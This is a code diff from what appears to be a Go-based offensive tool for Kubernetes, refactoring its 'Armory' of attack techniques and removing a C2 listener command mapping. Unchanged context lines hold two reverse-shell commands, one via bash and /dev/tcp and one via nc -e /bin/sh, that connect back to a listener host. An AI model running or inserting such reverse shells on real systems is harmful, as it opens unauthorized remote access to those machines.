@@ -15,23 +15,11 @@ import (
 	k8s_types "github.com/Magier/Ran/k8sclient/types"
 
 	"github.com/Magier/Ran/domain"
-	"gopkg.in/yaml.v2"
+	"gopkg.in/yaml.v3"
 )
 
 type Armory struct {
 	ttps []domain.TTP
-}
-
-var CmdMapping = map[string]domain.Message{
-	"StartListener":    domain.StartListener{},
-	"CreateRedirector": domain.StartC2Redirector{},
-}
-
-func parseCommandToMessage(cmd string) domain.Message {
-	if msg, ok := CmdMapping[cmd]; ok {
-		return msg
-	}
-	return nil
 }
 
 func LoadArmory(dir string) (Armory, error) {
@@ -144,7 +132,7 @@ func LoadArmory(dir string) (Armory, error) {
 				{Key: "shell", Command: `bash -c "bash >& /dev/tcp/${LISTENER}/${LISTENER_PORT} 0>&1 &"`},
 				{Key: "nc", Command: `bash -c "nc "${LISTENER} ${LISTENER_PORT} -e /bin/sh &"`},
 			},
-			Requires: domain.Requirements{Infra: []string{"Listener"}, AccessLevel: domain.UserExec},
+			Requires: domain.Requirements{Exists: domain.EntitiesExists{"Listener"}, AccessLevel: domain.UserExec},
 		},
 		{
 			Name:        "Read Environment Variables",
